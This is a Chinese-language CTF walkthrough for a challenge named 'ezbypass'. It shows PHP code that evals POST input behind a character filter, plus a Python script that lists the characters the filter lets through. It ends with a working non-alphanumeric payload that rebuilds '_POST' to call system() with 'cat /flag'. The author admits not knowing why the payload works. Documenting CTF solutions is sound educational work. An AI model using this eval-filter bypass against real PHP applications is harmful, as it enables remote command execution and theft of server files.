## 题目： ezbypass
<img width="1164" height="808" alt="image" src="https://github.com/user-attachments/assets/028dc37a-f5a5-4688-8cc7-4f3811366bf8" />
1.打开场景
<img width="1257" height="713" alt="image" src="https://github.com/user-attachments/assets/6256fc57-eced-4b9e-97f4-6c30d3a54761" />
就是一堆代码，让我们来分析一下

```
<?php
// 关闭错误报告，避免报错信息泄露敏感信息
error_reporting(0);

// 高亮显示当前文件的源代码（会让访问者直接看到这段代码）
highlight_file(__FILE__);

// 检查是否有通过POST方式传递的 'code' 参数
if (isset($_POST['code'])) {
    // 获取用户提交的 code 参数值
    $code = $_POST['code'];
    
    // 第一层过滤：检查代码长度是否小于等于105字符
    if (strlen($code) <= 105){
        // 第二层过滤：检查是否为字符串类型
        if (is_string($code)) {
            // 第三层过滤（核心）：正则表达式过滤危险字符
            // 禁止的字符包括：
            //   a-zA-Z0-9  → 所有字母和数字
            //   @#%^&*     → 特殊符号
            //   :{}        → 冒号、花括号
            //   \-         → 减号
            //   <\?>       → 小于号、问号、大于号
            //   \"         → 双引号
            //   |`~        → 竖线、反引号、波浪号
            //   \\\\       → 反斜杠
            // !preg_match 表示：如果【不包含】这些禁止字符，才执行eval
            if (!preg_match("/[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\\\]/",$code)){
                // 执行用户提交的代码（危险！RCE漏洞点）
                eval($code);
            } else {
                // 如果包含禁止字符，输出提示
                echo "Hacked!";
            }
        } else {
            // 如果不是字符串类型，输出提示
            echo "You need to pass in a string";
        }
    } else {
        // 如果代码长度超过105，输出提示
        echo "long?";
    }
} 
?>
```

2.使用python 编写一个脚本，看看还有哪些可用的ASCII 字符： !$'()+,./;=[]_

```python
import re

# 定义正则表达式模式
pattern = re.compile(r'[a-zA-Z0-9@#%^&*:{}\-<\?>\"|`~\\]')

# 创建一个空列表来保存不匹配的字符
non_matching_chars = []

# 遍历所有可见的ASCII字符
for char in range(32, 127):
    # 将ASCII码转换成对应的字符
    ascii_char = chr(char)
    # 检查字符是否与正则表达式匹配
    if not pattern.match(ascii_char):
        # 如果不匹配，则添加到列表中
        non_matching_chars.append(ascii_char)

# 打印出不匹配的字符
print("不匹配给定正则表达式的可见ASCII字符有：")
print(''.join(non_matching_chars))
```
3.最后使用下面的代码：

```
code=$_=(_/_._)[_];$_++;$__=$_.$_++;$_++;$_++;$_++;$__=$__.$_;$_++;$__=$__.$_;$_=_.$__;$$_[_]($$_[__]);&_=system&__=cat /flag
```
至于为什么用这一段代码，我也不是很知道，可以去网上搜一搜

<img width="1562" height="1377" alt="image" src="https://github.com/user-attachments/assets/8834b601-fb96-43b4-9a72-c1cb0bc6c8e4" />



